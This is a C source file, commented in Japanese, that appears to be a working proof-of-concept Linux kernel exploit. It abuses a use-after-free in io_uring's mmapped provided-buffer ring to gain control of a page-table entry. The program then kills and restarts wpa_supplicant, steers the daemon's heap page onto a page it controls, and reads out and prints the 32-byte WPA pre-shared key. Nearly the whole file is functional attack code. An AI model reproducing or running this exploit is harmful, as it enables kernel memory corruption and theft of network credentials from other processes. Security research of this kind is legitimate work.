#include "wpa.h"
#include "utils.h"
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <liburing.h>

/* PSK の長さ 256bit = 32byte*/
const int KEY_LENGTH = 32;

/* dummy page */
const int DUMMY_PAGE = 199;

/* busy loop */
const int BUSY_LOOP = 5;

// psk の heap 領域からのオフセットは 0x5000 の場合が多い
const int OFFSET = 0x5000;

// psk のページ内オフセット
const int PAGE_IN_OFFSET = 0x1f6;

void arrange_psk(const uint64_t *psk) {
    puts("========== PSK ==========");
    uint64_t value;
    for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
        value = psk[i];
        while (value > 0) {
            printf("%02lx ", value % 0x100);
            value /= 0x100;
        }
    }
    puts("");
}

int main() {
    int i;

    // psk を 64bit ずつ格納する配列
    uint64_t psk[KEY_LENGTH / sizeof(uint64_t)];

    // 領域を3つ確保
    void *new_map_1 = mmap_fixed((void *)0xdead000000);
    void *new_map_2 = mmap_fixed((void *)0xdead200000);
    void *new_map_3 = mmap_fixed((void *)0xdead201000);

    // io_uring の初期化
    struct io_uring ring;
    io_uring_queue_init(40, &ring, 0);

    // register buffer ring
    struct io_uring_buf_reg reg = {
        .ring_entries = 1,
        .bgid = 0,
        .flags = IOU_PBUF_RING_MMAP
    };
    io_uring_register_buf_ring(&ring, &reg, 0);

    // ユーザ空間にマップ
    void *pbuf_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring.ring_fd, IORING_OFF_PBUF_RING);
    if (pbuf_map == MAP_FAILED) {
        err_exit("[-] mmap() failed");
    }
    printf("[+] pbuf mapped at %p\n", pbuf_map);

    // ページフォルト: 1 回目
    *(uint8_t *)new_map_1 = 'A';

    // ring 解放
    io_uring_unregister_buf_ring(&ring, reg.bgid);
    
    // ページフォルト: 2 回目
    // PTE が配置される
    // new_map_3 に秘密情報を誘導する
    *(uint8_t *)new_map_2 = 'A';
    *(uint8_t *)new_map_3 = 'A';

    address target_page;
    target_page.virt_addr = new_map_3;
    target_page.phys_addr = v2p(0, new_map_3);

    // Use-After-Free
    // PTE が配置されているか確認
    printf("[+] at %p: %lx\n", pbuf_map, *(uint64_t *)pbuf_map);
    printf("[+] at %p: %lx\n", (uint64_t *)pbuf_map + 1, *((uint64_t *)pbuf_map + 1));

    // new_map_3 の pfn を保存
    uint64_t new_map_3_pfn = *((uint64_t *)pbuf_map + 1);

    // ダミーページ確保
    address dummy_pages[DUMMY_PAGE];
    for (i = 0; i < DUMMY_PAGE; i++) {
        dummy_pages[i].virt_addr = mmap_custom();
        if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
        dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
    }

    // wpa_supplicant が起動中なら一度止める
    if (get_process_id()) {
        if (kill_wpa_supplicant()) {
            err_exit("[-] failed to kill wpa_supplicant");
        }
    }

    // 他のプロセスに CPU を譲る
    for (i = 0; i < 10; i++) {
        sched_yield();
    }

    // new_map_3 解放
    if (munmap(new_map_3, 0x1000) == -1) err_exit("[-] munmap() failed");

    // ダミーページ解放
    for (i = 0; i < DUMMY_PAGE; i++) {
        munmap(dummy_pages[i].virt_addr, 0x1000);
    }

    // wpa_supplicant 起動
    if (start_wpa_supplicant()) {
        err_exit("[-] failed to start wpa_supplicant");
    }
    puts("[+] start wpa_supplicant");

    // wpa_supplicant が秘密情報を配置するまで待機
    busy_loop(BUSY_LOOP);

    // wpa_supplicant のプロセスID取得
    int pid = get_process_id();
    printf("[+] pid = %d\n", pid);

    // wpa_supplicant プロセスの heap 領域のアドレスを取得
    uint64_t heap_addr = get_heap_start_address(pid);
    printf("[+] heap address = 0x%lx\n", heap_addr);

    // PSK が格納されているページのアドレス取得
    uint64_t psk_page_addr = heap_addr + OFFSET;
    printf("[+] psk address = 0x%lx\n", psk_page_addr);

    // 物理アドレス計算
    uint64_t phys_addr = v2p(pid, (void *)psk_page_addr);
    printf("[+] physical address = 0x%lx\n", phys_addr);

    // 誘導に成功したか確認
    if (target_page.phys_addr == phys_addr) {
        // PTE 書き換え
        *(uint64_t *)pbuf_map = new_map_3_pfn;

        puts("[+] successfully lead to the target page");
        uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
        for (i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
            psk[i] = *(uint64_t *)(psk_addr + i * sizeof(uint64_t));
        }
        arrange_psk(psk);
    } else {
        puts("[-] failed to lead to the target page");
    }

    // 後処理
    munmap(new_map_1, 0x1000);
    // munmap(pbuf_map, 0x1000);
    kill_wpa_supplicant();
    // munmap(new_map_2, 0x1000);
    io_uring_queue_exit(&ring);

    return 0;
}
